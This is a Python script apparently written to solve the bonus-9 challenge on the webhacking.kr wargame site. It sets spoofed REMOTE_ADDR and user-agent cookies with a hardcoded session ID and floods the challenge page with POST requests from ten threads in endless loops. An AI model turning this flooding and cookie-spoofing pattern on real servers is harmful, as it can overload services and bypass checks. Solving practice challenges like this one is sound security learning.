import requests
import hashlib
import concurrent.futures
import time

def send_request(session_id, url, user_agent):
    cookies = {
        'PHPSESSID': session_id,
        'REMOTE_ADDR': "17.27.70.12.00.12.00.12.1",
        'HTTP_USER_AGENT': user_agent
    }
    params = {"kk": hashlib.md5(user_agent.encode()).hexdigest()}
    data = {"id": ''':)
            היי יהל, מה נשמע?'''}

    while True:
        response = requests.post(url, params=params, data=data, cookies=cookies)
        print(f"Response status code: {response.status_code}")
        # Add a small delay if needed to avoid overwhelming the server
        time.sleep(0.1)

def main():
    URL = "https://webhacking.kr/challenge/bonus-9/index.php"
    SESSION_ID = "uh10h2dmbcqe99b0pgp44gecov"
    USER_AGENT = "python-requests/2.31.0"

    # Number of threads you want to use
    num_threads = 10

    while True:
        with concurrent.futures.ThreadPoolExecutor(max_workers=num_threads) as executor:
            futures = [executor.submit(send_request, SESSION_ID, URL, USER_AGENT) for _ in range(num_threads)]
            try:
                for future in concurrent.futures.as_completed(futures):
                    # This line will only be reached if any thread finishes (unlikely in this setup)
                    future.result()
            except KeyboardInterrupt:
                print("Stopping threads...")

if __name__ == "__main__":
    main()
